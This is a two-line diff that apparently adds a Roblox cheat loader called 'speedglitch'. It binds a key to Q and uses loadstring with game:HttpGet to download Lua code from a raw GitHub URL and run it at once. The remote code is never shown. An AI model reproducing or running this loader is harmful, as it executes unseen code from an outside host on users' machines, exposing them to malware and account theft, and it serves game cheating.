@@ -1,0 +1,2 @@
+Key = Enum.KeyCode.Q -- If you want to change the keybind, change "Q" with something else
+loadstring(game:HttpGet("https://raw.githubusercontent.com/4am6am/speedglitch/main/legit", true))()
